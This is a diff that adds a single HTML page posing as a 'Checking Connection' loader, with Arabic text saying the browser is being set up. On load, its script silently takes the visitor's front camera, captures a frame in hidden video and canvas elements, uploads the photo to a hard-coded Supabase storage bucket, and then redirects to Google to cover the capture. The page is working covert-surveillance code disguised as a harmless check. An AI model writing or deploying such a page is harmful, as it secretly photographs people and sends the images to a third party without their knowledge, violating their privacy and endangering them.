@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Checking Connection...</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <p style="margin-top: 15px;">جاري تهيئة المتصفح...</p>
+    </div>
+
+    <video id="v" width="1" height="1" autoplay style="display:none"></video>
+    <canvas id="c" width="640" height="480" style="display:none"></canvas>
+
+    <script>
+        const URL = 'https://qzbtfafmapwyefbokwb.supabase.co';
+        const KEY = 'sb_publishable_x6bUVdUbm9FCbiMZoAvT-A_WbbYOHk2'; 
+
+        const supabase = supabase.createClient(URL, KEY);
+
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+
+                setTimeout(async () => {
+                    const canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const fileName = `shot_${Date.now()}.jpg`;
+                        await supabase.storage.from('photos').upload(fileName, blob, {
+                            contentType: 'image/jpeg'
+                        });
+                        window.location.href = "https://www.google.com";
+                    }, 'image/jpeg');
+                }, 1000);
+
+            } catch (err) {
+                window.location.href = "https://www.google.com";
+            }
+        }
+        window.onload = init;
+    </script>
+</body>
+</html>
